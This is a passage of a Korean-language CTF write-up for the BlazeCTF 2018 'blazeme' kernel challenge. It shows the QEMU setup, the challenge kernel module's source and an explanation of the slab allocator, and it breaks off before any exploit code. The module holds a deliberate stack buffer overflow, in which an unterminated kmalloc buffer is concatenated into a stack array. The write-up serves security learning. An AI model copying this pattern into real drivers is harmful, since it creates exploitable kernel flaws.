<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="blazeme - BlazeCTF 2018" /><meta name="author" content="nonetype" /><meta property="og:locale" content="en_US" /><meta name="description" content="BOF를 통한 ret2usr kernel exploit" /><meta property="og:description" content="BOF를 통한 ret2usr kernel exploit" /><link rel="canonical" href="https://nonetype.kr/posts/BlazeCTF2018-blazeme-write-up/" /><meta property="og:url" content="https://nonetype.kr/posts/BlazeCTF2018-blazeme-write-up/" /><meta property="og:site_name" content="do:pwn()" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-09-16T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="blazeme - BlazeCTF 2018" /><meta name="twitter:site" content="@nonetype_pwn" /><meta name="twitter:creator" content="@nonetype" /><meta name="google-site-verification" content="googlef894166fa16bb09c" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"nonetype"},"description":"BOF를 통한 ret2usr kernel exploit","url":"https://nonetype.kr/posts/BlazeCTF2018-blazeme-write-up/","headline":"blazeme - BlazeCTF 2018","dateModified":"2020-12-02T12:49:34+08:00","datePublished":"2019-09-16T00:00:00+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://nonetype.kr/posts/BlazeCTF2018-blazeme-write-up/"},"@type":"BlogPosting","@context":"https://schema.org"}</script><title>blazeme - BlazeCTF 2018 | do:pwn()</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="do:pwn()"><meta name="application-name" content="do:pwn()"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-HLXHMG7DE3"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-HLXHMG7DE3'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/me.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">do:pwn()</a></div><div class="site-subtitle font-italic">AttributeError - 'NoneType'</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/nonetype" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/nonetype_pwn" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['exploit','kakao.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>blazeme - BlazeCTF 2018</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>blazeme - BlazeCTF 2018</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> nonetype </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Sep 16, 2019, 12:00 AM +0800" prep="on" > Sep 16, 2019 <i class="unloaded">2019-09-16T00:00:00+08:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Wed, Dec 2, 2020, 1:49 PM +0900" prefix="Updated " > Dec 2, 2020 <i class="unloaded">2020-12-02T12:49:34+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2800 words">15 min</span></div></div><div class="post-content"><p>BOF를 통한 ret2usr kernel exploit</p><hr /><h1 id="목차">목차</h1><ol id="markdown-toc"><li><a href="#목차" id="markdown-toc-목차">목차</a><li><a href="#analysis" id="markdown-toc-analysis">Analysis</a><li><a href="#slab-allocator" id="markdown-toc-slab-allocator">Slab Allocator</a><li><a href="#finding-vulnerability" id="markdown-toc-finding-vulnerability">Finding Vulnerability</a><li><a href="#exploitation" id="markdown-toc-exploitation">Exploitation</a><ol><li><a href="#추가중" id="markdown-toc-추가중">추가중</a><li><a href="#result" id="markdown-toc-result">Result</a></ol><li><a href="#references" id="markdown-toc-references">References</a></ol><hr /><p>대부분의 보호기법이 꺼져있는 환경에서 커널 익스플로잇 문제이다.</p><blockquote><p><a href="/assets/blazeme.tar.gz">download</a></p></blockquote><h1 id="analysis">Analysis</h1><p>첨부파일 압축을 해제하면 <code class="language-plaintext highlighter-rouge">images/</code> 디렉터리 내에 다음과 같은 파일들이 존재한다.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>nonetype@pwn:~/images<span class="nv">$ </span><span class="nb">ls
</span>blazeme.c  bzImage  rootfs.ext2  run.sh
nonetype@pwn:~/images<span class="err">$</span>
</pre></table></code></div></div><p>우선 run.sh 파일을 확인해보자.</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c">#!/bin/sh</span>
/usr/bin/qemu-system-x86_64 <span class="nt">-kernel</span> bzImage <span class="nt">-smp</span> 1 <span class="nt">-hda</span> rootfs.ext2 <span class="nt">-boot</span> c <span class="nt">-m</span> 64M <span class="nt">-append</span> <span class="s2">"root=/dev/sda nokaslr rw ip=10.0.2.15:10.0.2.2:10.0.2.2 console=tty1 console=ttyAMA0"</span> <span class="nt">-net</span> nic,model<span class="o">=</span>ne2k_pci <span class="nt">-net</span> user <span class="nt">-nographic</span>
</pre></table></code></div></div><p>run.sh는 qemu를 통해 동일 디렉터리 내에 존재하는 <code class="language-plaintext highlighter-rouge">bzImage</code>를 <code class="language-plaintext highlighter-rouge">rootfs.ext2</code> 파일시스템으로 부팅해준다.</p><p>해당 스크립트를 실행시켜 qemu를 실행해보자.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>nonetype@pwn:~/images<span class="nv">$ </span><span class="nb">sudo</span> ./run.sh
WARNING: Image format was not specified <span class="k">for</span> <span class="s1">'rootfs.ext2'</span> and probing guessed raw.
         Automatically detecting the format is dangerous <span class="k">for </span>raw images, write operations on block 0 will be restricted.
         Specify the <span class="s1">'raw'</span> format explicitly to remove the restrictions.
qemu-system-x86_64: warning: TCG doesn<span class="s1">'t support requested feature: CPUID.01H:ECX.vmx [bit 5]

Welcome to Buildroot
buildroot login:
</span></pre></table></code></div></div><p>id는 <code class="language-plaintext highlighter-rouge">blazeme</code>, pw는 <code class="language-plaintext highlighter-rouge">guest</code>이다.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>buildroot login: blazeme
Password:
login: can<span class="s1">'t change directory to '</span>/home/blazeme<span class="s1">'
$ ls
bin         lib         lost+found  opt         run         tmp
dev         lib64       media       proc        sbin        usr
etc         linuxrc     mnt         root        sys         var
$
</span></pre></table></code></div></div><p>정상적으로 이미지가 실행된다 우선, <code class="language-plaintext highlighter-rouge">blazeme.c</code>를 확인하여 취약점을 어떤 방식으로 트리거링 할 수 있는지 알아보자.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;linux/module.h&gt;
#include &lt;linux/version.h&gt;
#include &lt;linux/kernel.h&gt;
#include &lt;linux/types.h&gt;
#include &lt;linux/kdev_t.h&gt;
#include &lt;linux/fs.h&gt;
#include &lt;linux/device.h&gt;
#include &lt;linux/cdev.h&gt;
#include &lt;linux/uaccess.h&gt;
#include &lt;linux/slab.h&gt;
</span>
<span class="cp">#define DEVICE_NAME "blazeme"
</span>
<span class="cp">#define ERR_BLAZEME_OK (1)
#define ERR_BLAZEME_MALLOC_FAIL (2)
</span>
<span class="cp">#define KBUF_LEN (64)
</span>
<span class="n">dev_t</span> <span class="n">dev</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">static</span> <span class="k">struct</span> <span class="n">cdev</span> <span class="n">cdev</span><span class="p">;</span>
<span class="k">static</span> <span class="k">struct</span> <span class="n">class</span> <span class="o">*</span><span class="n">blazeme_class</span><span class="p">;</span>

<span class="kt">ssize_t</span> <span class="nf">blazeme_read</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">,</span>
								<span class="n">loff_t</span> <span class="o">*</span><span class="n">ppos</span><span class="p">);</span>
<span class="kt">ssize_t</span> <span class="nf">blazeme_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span>
		<span class="kt">size_t</span> <span class="n">count</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">ppos</span><span class="p">);</span>

<span class="kt">int</span> <span class="nf">blazeme_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">);</span>
<span class="kt">int</span> <span class="nf">blazeme_close</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">);</span>

<span class="kt">char</span> <span class="o">*</span><span class="n">kbuf</span><span class="p">;</span>

<span class="k">struct</span> <span class="n">file_operations</span> <span class="n">blazeme_fops</span> <span class="o">=</span>
<span class="p">{</span>
    <span class="p">.</span><span class="n">owner</span>           <span class="o">=</span> <span class="n">THIS_MODULE</span><span class="p">,</span>
    <span class="p">.</span><span class="n">read</span>            <span class="o">=</span> <span class="n">blazeme_read</span><span class="p">,</span>
    <span class="p">.</span><span class="n">write</span>           <span class="o">=</span> <span class="n">blazeme_write</span><span class="p">,</span>
    <span class="p">.</span><span class="n">open</span>            <span class="o">=</span> <span class="n">blazeme_open</span><span class="p">,</span>
    <span class="p">.</span><span class="n">release</span>         <span class="o">=</span> <span class="n">blazeme_close</span><span class="p">,</span>
<span class="p">};</span>

<span class="kt">ssize_t</span> <span class="nf">blazeme_read</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">,</span>
								<span class="n">loff_t</span> <span class="o">*</span><span class="n">ppos</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="n">count</span><span class="p">;</span>
	<span class="kt">ssize_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">ERR_BLAZEME_OK</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">&gt;</span> <span class="n">KBUF_LEN</span> <span class="o">||</span> <span class="n">kbuf</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">ret</span> <span class="o">=</span> <span class="n">ERR_BLAZEME_OK</span><span class="p">;</span>
		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">copy_to_user</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">kbuf</span><span class="p">,</span> <span class="n">len</span><span class="p">))</span> <span class="p">{</span>
		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="p">(</span><span class="kt">ssize_t</span><span class="p">)</span><span class="n">len</span><span class="p">;</span>

<span class="nl">out:</span>
	<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">ssize_t</span> <span class="nf">blazeme_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span>
						<span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span>
						<span class="kt">size_t</span> <span class="n">count</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">ppos</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">str</span><span class="p">[</span><span class="mi">512</span><span class="p">]</span> <span class="o">=</span> <span class="s">"Hello "</span><span class="p">;</span>
	<span class="kt">ssize_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">ERR_BLAZEME_OK</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">buf</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"blazeme_write get a null ptr: buffer</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">ret</span> <span class="o">=</span> <span class="n">ERR_BLAZEME_OK</span><span class="p">;</span>
		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="n">KBUF_LEN</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"blazeme_wrtie invaild paramter count (%zu)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
		<span class="n">ret</span> <span class="o">=</span> <span class="n">ERR_BLAZEME_OK</span><span class="p">;</span>
		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">kbuf</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">kbuf</span> <span class="o">=</span> <span class="n">kmalloc</span><span class="p">(</span><span class="n">KBUF_LEN</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">kbuf</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"blazeme_write malloc fail</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">ret</span> <span class="o">=</span> <span class="n">ERR_BLAZEME_MALLOC_FAIL</span><span class="p">;</span>
		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="n">kbuf</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">count</span><span class="p">))</span> <span class="p">{</span>
		<span class="n">kfree</span><span class="p">(</span><span class="n">kbuf</span><span class="p">);</span>
		<span class="n">kbuf</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">kbuf</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">strncat</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="n">kbuf</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">kbuf</span><span class="p">));</span>
		<span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"%s"</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="p">(</span><span class="kt">ssize_t</span><span class="p">)</span><span class="n">count</span><span class="p">;</span>

<span class="nl">out:</span>
	<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">blazeme_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">blazeme_close</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">blazeme_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="n">ret</span> <span class="o">=</span> <span class="n">alloc_chrdev_region</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dev</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">DEVICE_NAME</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printk</span><span class="p">(</span><span class="s">"blazeme_init failed alloc: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
		<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cdev</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">cdev</span><span class="p">));</span>

	<span class="n">cdev_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cdev</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">blazeme_fops</span><span class="p">);</span>
	<span class="n">cdev</span><span class="p">.</span><span class="n">owner</span> <span class="o">=</span> <span class="n">THIS_MODULE</span><span class="p">;</span>
	<span class="n">cdev</span><span class="p">.</span><span class="n">ops</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">blazeme_fops</span><span class="p">;</span>

	<span class="n">ret</span> <span class="o">=</span> <span class="n">cdev_add</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cdev</span><span class="p">,</span> <span class="n">dev</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printk</span><span class="p">(</span><span class="s">"blazeme_init, cdev_add fail</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">blazeme_class</span> <span class="o">=</span> <span class="n">class_create</span><span class="p">(</span><span class="n">THIS_MODULE</span><span class="p">,</span> <span class="n">DEVICE_NAME</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">IS_ERR</span><span class="p">(</span><span class="n">blazeme_class</span><span class="p">))</span> <span class="p">{</span>
		<span class="n">printk</span><span class="p">(</span><span class="s">"blazeme_init, class create failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">dev</span> <span class="o">=</span> <span class="n">device_create</span><span class="p">(</span><span class="n">blazeme_class</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">dev</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">DEVICE_NAME</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">IS_ERR</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cdev</span><span class="p">))</span> <span class="p">{</span>
		<span class="n">ret</span> <span class="o">=</span> <span class="n">PTR_ERR</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cdev</span><span class="p">);</span>
		<span class="n">printk</span><span class="p">(</span><span class="s">"blazeme_init device create failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

		<span class="n">class_destroy</span><span class="p">(</span><span class="n">blazeme_class</span><span class="p">);</span>
		<span class="n">cdev_del</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cdev</span><span class="p">);</span>
		<span class="n">unregister_chrdev_region</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dev</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>

		<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">blazeme_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">cdev_del</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cdev</span><span class="p">);</span>
	<span class="n">class_destroy</span><span class="p">(</span><span class="n">blazeme_class</span><span class="p">);</span>
	<span class="n">unregister_chrdev_region</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dev</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">module_init</span><span class="p">(</span><span class="n">blazeme_init</span><span class="p">);</span>
<span class="n">module_exit</span><span class="p">(</span><span class="n">blazeme_exit</span><span class="p">);</span>
<span class="n">MODULE_LICENSE</span><span class="p">(</span><span class="s">"GPL"</span><span class="p">);</span>
<span class="n">MODULE_AUTHOR</span><span class="p">(</span><span class="s">"BLAZECTF 2018 crixer"</span><span class="p">);</span>
<span class="n">MODULE_DESCRIPTION</span><span class="p">(</span><span class="s">"BLAZECTF CTF 2018 Challenge Kernel Module"</span><span class="p">);</span>
</pre></table></code></div></div><p>우선 눈에 띄는 부분은 <code class="language-plaintext highlighter-rouge">struct file_operations blazeme_fops</code> 부분이었다. 해당 구조체는 pwnable.kr syscall 문제를 풀어볼 때 공부했던 내용<sup id="fnref:fops" role="doc-noteref"><a href="#fn:fops" class="footnote" rel="footnote">1</a></sup> <sup id="fnref:fops_exploit" role="doc-noteref"><a href="#fn:fops_exploit" class="footnote" rel="footnote">2</a></sup>과 관련이 있어서 소스를 보자마자 <code class="language-plaintext highlighter-rouge">/dev/blazeme</code>를 open/read/write 할 시 구조체 내 포인터의 함수가 호출된다는 것을 알 수 있었다.</p><p><code class="language-plaintext highlighter-rouge">/dev/blazeme</code>디바이스에 “TEST”라는 값을 쓰게 되면, <code class="language-plaintext highlighter-rouge">blazeme_write()</code>함수가 호출되어 모듈 내의 <code class="language-plaintext highlighter-rouge">kbuf</code> 버퍼에 <code class="language-plaintext highlighter-rouge">TEST</code>라는 값이 쓰이게 되고, <code class="language-plaintext highlighter-rouge">strncat(), printk()</code> 함수를 통해 kernel log에 <code class="language-plaintext highlighter-rouge">Hello TEST</code>라는 값이 최종적으로 출력될 것이다.</p><p>확인을 위해 <code class="language-plaintext highlighter-rouge">/dev/blazeme</code>에 “nonetype” 문자열을 넣고 dmesg 명령을 통해 커널 로그를 확인해보았다.</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"nonetype"</span> <span class="o">&gt;</span> /dev/blazeme
<span class="nv">$ </span>dmesg | <span class="nb">tail</span> <span class="nt">-n</span> 1
Hello nonetype
<span class="err">$</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/expected.jpg" alt="expected" /></p><p>예상대로 <code class="language-plaintext highlighter-rouge">Hello nonetype</code>이 출력됬다.</p><h1 id="slab-allocator">Slab Allocator</h1><p>취약점을 찾기 위해서는 <code class="language-plaintext highlighter-rouge">SLAB Allocator</code><sup id="fnref:slab_allocator" role="doc-noteref"><a href="#fn:slab_allocator" class="footnote" rel="footnote">3</a></sup>를 이해해야 한다. Slab Allocator는 동적 메모리 할당시 ptmalloc과는 다르게 힙 청크 내부에 메타데이터를 저장하지 않으며, 할당 해제시에 청크 첫 부분에 FP(Free Pointer)를 설정하여 Simple Linked List처럼 다음 Freed Chunk를 가르킨다.</p><p>간단하게 그림으로 표현하자면, 문자 A B C를 각각 64바이트씩 할당한다면 아래와 같은 모습으로 할당이 된다.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>+0x00    +0x40    +0x80    +0xc0
v        v        v        v
+-------------------------------------------+
|        |        |        |                |
|        |        |        |                |
| A * 64 | B * 64 | C * 64 | More Chunks... |
|        |        |        |                |
|        |        |        |                |
